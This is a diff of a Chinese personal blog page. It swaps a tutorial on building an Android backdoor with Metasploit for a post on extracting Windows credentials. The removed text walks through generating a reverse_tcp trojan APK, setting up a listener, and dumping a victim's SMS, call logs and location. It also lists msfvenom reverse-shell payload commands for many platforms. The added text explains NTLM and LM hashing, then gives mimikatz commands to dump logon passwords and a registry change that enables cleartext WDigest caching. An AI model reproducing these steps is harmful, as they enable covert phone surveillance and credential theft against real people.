@@ -6,22 +6,22 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-  <title>Android 后门程序</title>
+  <title>H系列 - Windows系统的账号密码</title>
   <meta name="description"
-    content="纵然时光相隔百年，仍感你心近在咫尺。">
+    content="你还拥有多少，你还在乎多少。">
   <meta name="author" content="leopardpan">
 
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title"
-    content="Android 后门程序">
+    content="H系列 - Windows系统的账号密码">
   <meta name="twitter:description"
-    content="纵然时光相隔百年，仍感你心近在咫尺。">
+    content="你还拥有多少，你还在乎多少。">
 
   <meta property="og:type" content="article">
   <meta property="og:title"
-    content="Android 后门程序">
+    content="H系列 - Windows系统的账号密码">
   <meta property="og:description"
-    content="纵然时光相隔百年，仍感你心近在咫尺。">
+    content="你还拥有多少，你还在乎多少。">
 
   <link rel="icon" type="image/png" href="/images/avatar.jpg" />
   <link href="/images/avatar.jpg" rel="shortcut icon" type="image/png">
@@ -29,7 +29,7 @@
   <link rel="stylesheet" href=" /css/main.css">
   <link href="//netdna.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet">
 
-  <link rel="canonical" href="http://localhost:4000/2022/11/android%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F/">
+  <link rel="canonical" href="http://localhost:4000/2022/10/H%E7%B3%BB%E5%88%97-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/">
   <link rel="alternate" type="application/rss+xml" title="劉清揚" href="http://localhost:4000 /feed.xml">
 
   <meta name="google-site-verification" content="1-1ZlHoRvM0T2FqPbW2S-qLgYXN6rsn52kErlMPd_gw" />
@@ -203,10 +203,10 @@
         <div class="content-wrapper__inner">
             <article class="post-container post-container--single" itemscope itemtype="http://schema.org/BlogPosting">
   <header class="post-header">
-    <h1 class="post-title">Android 后门程序</h1>
+    <h1 class="post-title">H系列 - Windows系统的账号密码</h1>
     <div class="post-meta">
       <img src="/images/calendar.png" width="20px"/> 
-      <time datetime="2022-11-23 00:00:00 +0800" itemprop="datePublished" class="post-meta__date date">2022-11-23</time>  
+      <time datetime="2022-10-11 00:00:00 +0800" itemprop="datePublished" class="post-meta__date date">2022-10-11</time>  
          
       <span id="busuanzi_container_page_pv"> | 阅读：<span id="busuanzi_value_page_pv"></span>次</span>
     </p>
@@ -214,160 +214,118 @@
   </header>
 
   <section class="post">
-    <h3 id="纵然时光相隔百年仍感你心近在咫尺">纵然时光相隔百年，仍感你心近在咫尺。</h3>
+    <h3 id="你还拥有多少你还在乎多少">你还拥有多少，你还在乎多少。</h3>
 
-<h2 id="kali-linux利用msf入侵安卓手机">Kali Linux利用MSF入侵安卓手机</h2>
+<ul>
+  <li>
+    <p>系统  – windows 10；</p>
+  </li>
+  <li>
+    <p>Windows登录流程<br />
+<img src="/images/posts/H-windows/3.png" alt="" width="80%" /></p>
+  </li>
+  <li>
+    <p>账号密码文件的存储位置  – C:\Windows\System32\config\SAM（存储本地所有用户的凭证信息）；  <br />
+<img src="/images/posts/H-windows/1.png" alt="" width="80%" /></p>
+  </li>
+  <li>
+    <p>通过使用 mimikatz.exe 工具可以读取SAM文件；</p>
+  </li>
+  <li>SAM文件部分内容样例；
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>RID : 000001f4
+User :Administrator
+Hash NTLM : 570a9a65db8fba761c1008a51d4c95ab
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>百度搜索MD5解密，找个解密网站还原密码明文；
+<img src="/images/posts/H-windows/2.png" alt="" width="80%" /></p>
+  </li>
+  <li>NTLM-HASH 介绍</li>
+</ul>
 
-<p>环境：kali Linux。<br />
-靶机：One plus 6T。(验证了其它品牌手机或模拟器都可以)<br />
-工具：msfvenom、msfconsole（Kali系统内置，利用漏洞生成后门软件）。</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>NTLM（Windows NT Lan Manager）哈希是一种用于进行密码验证的加密散列函数，通常在Windows操作系统中使用。它用于在网络中验证用户的身份，并且在早期版本的Windows中广泛使用，但在现代环境中逐渐被更强大和安全性更高的哈希算法取代，如NTLMv2和Kerberos。
 
-<h2 id="大致流程">大致流程：</h2>
-<ol>
-  <li>生成手机安装的木马文件 -&gt; muma.apk.</li>
-  <li>开启监听程序，监听靶机是否上钩。</li>
-  <li>通过某些手段使靶机安装我们的木马文件，并点击打开。</li>
-  <li>当靶机安装木马文件并点击后，监听程序便得到了响应，通过命令获取靶机信息。</li>
-</ol>
+NTLM哈希的工作原理如下：
 
-<h2 id="go">go</h2>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1.启动kali系统，打开命令行。  
+密码哈希化：当用户设置密码时，操作系统将密码转换为一个固定长度的哈希值，即NTLM哈希。这个哈希值是用户密码的散列，无法逆向还原为原始密码。
 
-2.su        -》 进入root模式。
+挑战-响应协议：在进行身份验证时，服务器将生成一个随机的挑战（challenge），并将其发送给客户端。客户端使用其存储的NTLM哈希值对挑战进行哈希化，并将结果发送回服务器。
 
-3.ifconfig      -》 查看内网IP，如图，我的IP是 192.168.0.114，备用。
+服务器验证：服务器收到客户端发送的哈希值，使用存储在服务器上的用户的NTLM哈希值进行同样的哈希运算，然后比较两个哈希值是否匹配。如果匹配，则用户被验证成功。
+
+需要注意的是，NTLM哈希算法在安全性方面存在一些问题。它容易受到彩虹表攻击（通过预先计算可能的哈希值并与数据库中的哈希值进行匹配），并且相对较容易破解。由于这些安全隐患，现代网络安全标准更倾向于使用更安全的哈希算法，如SHA-256或SHA-512，并使用更复杂的身份验证机制，如Kerberos。
+
+总之，NTLM哈希是一种早期的密码散列算法，虽然曾经在Windows系统中广泛使用，但现在已被更安全的方法所取代。
 </code></pre></div></div>
 
+<ul>
+  <li>NTLM-HASH 加密原理</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1，明文密码：Admin@123
+2，将明文转为十六进制格式：41646D696E40313233
+3，将十六进制转为Unicode格式（每位后面加两个0）：410064006D0069006E004000310032003300
+4，将Unicode字符串进行MD4加密：570a9a65db8fba761c1008a51d4c95ab
+</code></pre></div></div>
+
+<ul>
+  <li>通过使用 mimikatz.exe 工具可以读取内存数据，下图为win7截图，win10看不到password明文密码；</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe
+privilege::debug
+sekurlsa::logonPasswords
+</code></pre></div></div>
+<p><img src="/images/posts/H-windows/4.png" alt="" width="80%" /></p>
+
+<ul>
+  <li>
+    <p>LM-HASH 介绍 
+<img src="/images/posts/H-windows/5.png" alt="" width="80%" /></p>
+  </li>
+  <li>
+    <p>LM-HASH 加密原理</p>
+  </li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1，明文密码：Admin@123
+2，将明文转为大写：ADMIN@123
+3，转为十六进制格式：41444D494E40313233
+4，不足14字节(28位)用0补全：41444D494E403132330000000000
+5，分两组  
+a组:41444D494E4031
+b组:32330000000000
+6，将每组的十六进制转为二进制
+a组:01000001010001000100110101001001010011100100000000110001
+b组:00110010001100110000000000000000000000000000000000000000
+7，每七个后面加一个0
+a组:01000000 10100010 00010010 10101000 10010100 01110010 00000000 01100010
+b组:00110010 00011000 11000000 00000000 00000000 00000000 00000000 00000000
+a组:0100000010100010000100101010100010010100011100100000000001100010
+b组:0011001000011000110000000000000000000000000000000000000000000000
+8，再转为十六进制
+a组:40A212A894720062
+b组:3218C00000000000
+9，做DES加密，
+使用固定明文 4B47532140232425 （KGS!@#$% 的十六进制数据）对两组数据进行DES加密
+a组:6F08D7B306B1DAD4
+b组:B75E0C8D76954A50
+拼接即得LM-HASH：6F08D7B306B1DAD4B75E0C8D76954A50
+
+</code></pre></div></div>
+<p><img src="/images/posts/H-windows/6.png" alt="" width="80%" /><br />
+<br />
+<img src="/images/posts/H-windows/7.png" alt="" width="80%" /></p>
+
+<ul>
+  <li>win10 如何查看内存明文密码？在cmd（管理员运行 C:\Windows\System32\cmd.exe）中修改注册表信息，重启再抓取即可。</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+</code></pre></div></div>
 <p><br />
-<img src="/images/posts/kaliMSF/1.png" alt="" width="80%" height="80%" /><br />
-<br /></p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>4.msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.0.114 lport=3369 &gt; muma.apk     
- -》  lhost是kali的IP；lport随便写一个没有被占用的端口号就可以，记住，后面有用到；文件名随便写，后缀是 .apk 就行。
- 如下图所示，此时木马文件已经生成，在 /home/kali  目录下。
-</code></pre></div></div>
-
-<p><br />
-<img src="/images/posts/kaliMSF/2.png" alt="" width="80%" height="80%" /><br />
-<br /></p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>5.在 /home/kali 目录下找到生成的muma.apk文件。
-</code></pre></div></div>
-
-<p><br />
-<img src="/images/posts/kaliMSF/3.png" alt="" width="80%" height="80%" /><br />
-<br /></p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>6. 我通过合法手段将木马文件安装在了我的测试机上。 
-</code></pre></div></div>
-
-<p><br />
-<img src="/images/posts/kaliMSF/4.jpeg" alt="" width="30%" height="30%" /><br />
-<br /></p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>7. msfconsole     -》 启动 kali 内置的 msfconsole 工具。
-</code></pre></div></div>
-
-<p><br />
-<img src="/images/posts/kaliMSF/5.png" alt="" width="80%" height="80%" /><br />
-<br /></p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>8.配置参数：   
-
-use exploit/multi/handler     -》 （选择模块）
-
-set payload android/meterpreter/reverse_tcp     -》（选择攻击模块）
-
-set LhOST 192.168.0.114     -》（填写自己主机的IP地址）
-
-set lport 3369      -》（填写刚才生成文件时的端口号）
-
-run   -》 开始监听 
-
-</code></pre></div></div>
-<p><br />
-<img src="/images/posts/kaliMSF/6.png" alt="" width="80%" height="80%" /><br />
-<br /></p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>9. 在靶机上点击刚刚安装的木马程序，并观察监听程序窗口，出现meterpreter你就已经成功的入侵。
-</code></pre></div></div>
-<p><br />
-<img src="/images/posts/kaliMSF/7.png" alt="" width="80%" height="80%" /><br />
-<br /></p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-一些入侵命令  
-
-1.查看对方手机系统信息
-
-命令：sysinfo
-
-2.查看对方手机安装哪些app文件
-
-命令：app_list
-
-3.实时查看对方手机的短信，所有短信，甚至包含手机上已经删除的
-
-命令：dump_sms
-
-4.获取对方手机的通话记录
-
-命令：dump_calllog
-
-5.实时获取对方手机GPS定位
-
-命令：geolocate
-
-</code></pre></div></div>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>如下图所示，这里成功的拿到了手机系统信息，以及所有短信，在 sms_dump_20221123021710.txt 这里。
-当出现 [-] Error running command dump_calllog: Rex::TimeoutError Operation timed out，这个信息时，
-则与靶机断开了连接，需要先退出监听 exit ，然后 重新运行 run ，再次在靶机上点击木马程序。
-
-</code></pre></div></div>
-<p><br />
-<img src="/images/posts/kaliMSF/8.png" alt="" width="80%" height="80%" /><br />
-<br /></p>
-
-<p><br />
-<img src="/images/posts/kaliMSF/9.png" alt="" width="80%" height="80%" /><br />
-<br /></p>
-
-<h2 id="问题">问题</h2>
-
-<ol>
-  <li>如何将木马文件安装在目标手机上，并诱导用户点击。</li>
-  <li>连接有很大概率被拒绝 [*] 192.168.0.102 - Meterpreter session 3 closed.  Reason: Died，需要重试多次。</li>
-  <li>连接过程中有很大概率被断开 [-] Error running command dump_calllog: Rex::TimeoutError Operation timed out，  需要重新运行监听程序。</li>
-  <li>获取信息多为敏感信息，比如短信，通讯录，通话记录，定位信息等，这里是需要木马程序在靶机上申请敏感权限获取的，此时用户便会知情，点击拒绝则无法获取信息。</li>
-</ol>
-
-<h2 id="其它">其它</h2>
-
-<p>你不只可以生成android手机的后台程序，还可以</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>windows
-msfvenom -p windows/meterpreter/reverse_tcp LPORT=控制机端口 LHOST=控制机ip -f -o shell.exe
-安卓app:
-msfvenom -p android/meterpreter/reverse_tcp LHOST=控制机ip LPORT=控制机端口 -o test2.apk
-Linux:
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=控制机ip LPORT=控制机端口 -f elf &gt; shell.elf
-Mac:
-msfvenom -p osx/x86/shell_reverse_tcp LHOST=控制机ip LPORT=控制机端口 -f macho &gt; shell.macho
-PHP：
-msfvenom -p php/meterpreter/reverse_tcp LHOST=控制机ip LPORT=控制机端口-f raw -o test.php
-ASP:
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=控制机ip LPORT=控制机端口-f asp &gt; shell.asp
-ASPX：
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=控制机ip LPORT=控制机端口-f aspx &gt; shell.aspx
-JSP:
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=控制机ip LPORT=控制机端口 -f raw &gt; shell.jsp
-Bash：
-msfvenom -p cmd/unix/reverse_bash LHOST=控制机ip LPORT=控制机端口-f   raw &gt; shell.sh
-Perl
-msfvenom -p cmd/unix/reverse_perl LHOST=控制机ip LPORT=控制机端口-f raw &gt; shell.pl
-Python
-msfvenom -p python/meterpreter/reverser_tcp LHOST=控制机ip LPORT=控制机端口-f   raw &gt; shell.py
-</code></pre></div></div>
+<img src="/images/posts/H-windows/8.png" alt="" width="80%" /></p>
 
 <p><br />
 <br /> 
@@ -376,7 +334,7 @@ msfvenom -p python/meterpreter/reverser_tcp LHOST=控制机ip LPORT=控制机端
 <br /> 
 <br /> 
 <br /> 
-转载请注明：<a href="http://yuqianglianshou.com">劉清揚的博客</a> » <a href="http://yuqianglianshou.com/2022/11/android后门程序/"> Android 后门程序 </a><br />
+转载请注明：<a href="http://yuqianglianshou.com">劉清揚的博客</a> » <a href="http://yuqianglianshou.com/2022/10/H系列-Windows系统的账号密码/"> H系列 - Windows系统的账号密码 </a><br />
 <br /></p>
 
 
@@ -581,15 +539,15 @@ msfvenom -p python/meterpreter/reverser_tcp LHOST=控制机ip LPORT=控制机端
   <ul class="pager">
     
     <li class="previous">
-      <a href="/2022/09/FFmpeg/" data-toggle="tooltip"
-        data-placement="top" title="FFmpeg">上一篇： <span>FFmpeg</span>
+      <a href="/2022/10/H%E7%B3%BB%E5%88%97-%E7%AB%AF%E5%8F%A3%E5%8F%B7/" data-toggle="tooltip"
+        data-placement="top" title="H系列 - 端口号">上一篇： <span>H系列 - 端口号</span>
       </a>
     </li>
     
     
     <li class="next">
-      <a href="/2023/01/%E6%88%91%E7%9A%842022%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/" data-toggle="tooltip"
-        data-placement="top" title="我的2022年终总结">下一篇： <span>我的2022年终总结</span>
+      <a href="/2022/10/H%E7%B3%BB%E5%88%97-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86_%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/" data-toggle="tooltip"
+        data-placement="top" title="H系列 - 信息收集_搜索引擎">下一篇： <span>H系列 - 信息收集_搜索引擎</span>
       </a>
     </li>
     
